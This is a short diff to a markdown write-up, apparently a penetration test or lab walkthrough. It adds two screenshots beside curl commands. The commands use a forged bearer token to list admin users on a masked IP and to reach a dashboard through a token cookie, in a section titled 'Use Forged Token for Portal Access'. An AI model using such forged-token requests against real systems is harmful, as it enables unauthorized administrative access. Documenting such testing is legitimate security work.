@@ -553,6 +553,9 @@ curl -s http://203.x.x.x:8443/api/v1/admin/users \
      -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
 ```
 
+<img width="1044" height="1025" alt="image" src="https://github.com/user-attachments/assets/b73f05e8-7252-4e1c-b1af-fa37c37a7bf2" />
+
+
 ### 4.3 — Use Forged Token for Portal Access
 
 ```bash
@@ -560,6 +563,7 @@ curl -s http://203.x.x.x:8443/api/v1/admin/users \
 curl -s http://203.x.x.x:8443/dashboard \
      -b "rpal_token=${TOKEN}" | grep -i admin
 ```
+<img width="996" height="264" alt="image" src="https://github.com/user-attachments/assets/1f521566-e9fc-4271-a83a-184bfebbf775" />
 
 ---
 
